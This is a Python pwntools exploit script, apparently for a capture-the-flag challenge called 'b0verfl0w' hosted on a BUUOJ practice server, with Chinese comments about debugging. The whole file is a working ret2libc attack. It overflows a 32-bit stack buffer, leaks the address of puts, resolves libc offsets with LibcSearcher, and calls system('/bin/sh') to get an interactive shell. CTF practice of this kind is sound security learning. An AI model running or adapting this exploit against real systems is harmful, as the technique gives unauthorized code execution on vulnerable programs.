from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + libc.search('/bin/sh').next()

	return (system, binsh)


context(os='linux', arch='i386', log_level='debug')
binary = './b0verfl0w'

context.binary = binary
elf = ELF(binary)
io = remote('node4.buuoj.cn',29308) if argv[1]=='r' else process(binary)
# io= gdb.debug(binary,"break *0x080485A0")
# 注意一开始不对是因为少了一个ret_addr，不是为了对齐而是因为使用hint_addr时会到buufer的前四个字节
# gdb调试得知

search_fun = 'puts' #被泄露地址的函数
hint_addr = 0x8048500
main_addr = 0x804851B
ret_addr = 0x080485A0
print_fun = 'puts' #打印被泄露地址的函数

print_fun_plt = elf.plt[print_fun]
search_fun_got = elf.got[search_fun]

payload = b'a'*0x24 + p32(print_fun_plt) + p32(main_addr) + p32(search_fun_got)
io.sendlineafter(b'What\'s your name?',payload)
io.recvuntil(b'.')

search_addr = u32(io.recv(4))
print("search_addr = ",hex(search_addr))
system_addr,binsh_addr = ret2libc(search_addr,search_fun)

payload = b'a'*0x24  +p32(system_addr) + p32(main_addr) + p32(binsh_addr)
io.sendlineafter(b'What\'s your name?',payload)

io.interactive()


